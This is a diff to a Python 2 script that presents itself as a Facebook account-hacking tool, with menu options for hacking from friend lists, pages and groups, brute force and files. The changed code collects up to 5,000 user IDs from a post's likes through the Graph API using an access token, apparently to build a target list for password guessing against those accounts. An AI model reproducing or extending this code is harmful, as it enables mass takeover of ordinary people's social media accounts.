@@ -176,7 +176,7 @@ def super():
 	os.system('clear')
 	print logo
 	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
-	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
+	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Page and Groups"
 	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
 	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
 	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
@@ -201,19 +201,17 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;96m[*] Enter Group Or Page Public Post ID : ")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;31;40m[✺] Name : "+op["name"]
-		except KeyError:
-			print"\x1b[1;92m[✺] ID Not Found!"
-			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
-			super()
 		print"\033[1;35;40m[✺] Getting IDs..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/likes?access_token="+toket+"&limit=5000")
 		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
+		try:
+			for i in z['data']:
+				id.append(i['id'])
+		except:
+			print('\nPost not found')
+			time.sleep(1)
+			super()
+			
 	elif peak =="3":
 		os.system('clear')
 		print logo
